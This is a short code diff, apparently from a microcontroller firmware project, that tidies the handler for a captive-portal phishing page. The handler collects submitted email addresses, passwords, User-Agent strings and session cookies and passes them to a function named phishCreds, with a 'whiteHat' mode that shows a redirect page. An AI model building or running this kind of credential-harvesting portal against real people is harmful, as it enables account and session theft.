@@ -388,25 +388,15 @@ void startAP() {
       String url = server.arg("url");
       String user = server.arg("email");
       String pass = server.arg("password");
-      String userAgent;
-      String cookie;
+      String userAgent = "Unknown";
+      String cookie = "no cookies";
 
-      if (server.hasHeader("User-Agent")){
-        userAgent = server.header("User-Agent");
-      } else{
-        userAgent = "Unknown";
-      }
-      if (server.hasHeader("Cookie")){
-        cookie = server.header("Cookie");
-        Serial.println(cookie);
-      } else{
-        Serial.println("NO COOKIES");
-        cookie = "no cookies";
-      }
+      if (server.hasHeader("User-Agent")) userAgent = server.header("User-Agent");
+      if (server.hasHeader("Cookie")) cookie = server.header("Cookie");
+      Serial.println(cookie);
 
       phishCreds(url, user, pass, userAgent);
       if(whiteHat){
-
         sendProgmem(redirect_whitehathtml, sizeof(redirect_whitehathtml), W_HTML);
       }else{
         sendProgmem(captive500html, sizeof(captive500html), W_HTML);
